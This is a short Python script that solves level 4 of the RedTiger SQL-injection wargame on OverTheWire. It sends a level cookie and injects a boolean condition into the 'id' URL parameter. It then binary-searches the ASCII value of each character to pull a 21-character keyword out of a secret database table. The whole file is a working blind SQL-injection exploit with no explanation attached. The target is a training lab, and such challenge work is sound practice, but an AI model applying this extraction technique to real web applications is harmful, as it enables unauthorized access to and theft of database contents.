import re
import requests

def exe_get(url):
    cookies = {
        "level4login": "put_the_kitten_on_your_head"
    }
    response = requests.get(url, cookies=cookies)
    html = response.text
    match = re.search('0', html)
    if match:
        return -1
    else:
        return 1

def get_data_char(i):
    url_template = "https://redtiger.labs.overthewire.org/level4.php?id=2 or ascii(substr((select keyword from level4_secret),{0},1))>{1}"
    low,high = 48,126
    while low<=high:
        mid = (low+high)//2
        url = url_template.format(i,mid)
        result = exe_get(url)
        if result>0:
            low = mid+1
        else:
            high=mid-1
        print(low,high,mid)
    print (chr(low))
    return low

def get_data():
    data=""
    for i in range(1,22):
        char=get_data_char(i)
        data += chr(char)
        print(data)
get_data()